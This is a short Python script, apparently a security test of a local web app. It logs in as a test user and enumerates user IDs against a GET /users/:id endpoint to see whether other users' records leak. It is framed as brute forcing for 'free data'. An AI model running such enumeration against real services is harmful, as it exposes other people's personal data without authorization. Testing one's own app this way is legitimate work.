# Author: Ritchie Yapp
# https://github.com/speckly

# This script brute forces endpoint 11 GET /users/:id

import requests
import os

ENDPOINT = 'http://localhost:8081/users'
ID_LOWER_LIMIT, ID_UPPER_LIMIT = 34, 39
TEST_WITH_USER = True
headers = None


os.system('cls')
print("Script by @speckly\nFree data: the sequel\n")

if TEST_WITH_USER:
    LOGIN_BODY = {
        "username": "Joshua",
        "password": "jos123"
    }
    LOGIN_ENDPOINT = "http://localhost:8081/user/login"
    res = requests.post(LOGIN_ENDPOINT, json=LOGIN_BODY)
    TOKEN = res.json()["token"]
    print("Logged in as Joshua, userid 38")
    headers = {
        "authorization": f'Bearer {res.json()["token"]}'
    }

for user_id in range(ID_LOWER_LIMIT, ID_UPPER_LIMIT):
    res = requests.get(f"{ENDPOINT}/{user_id}", headers=headers).text
    print(f"{user_id}: {res}")

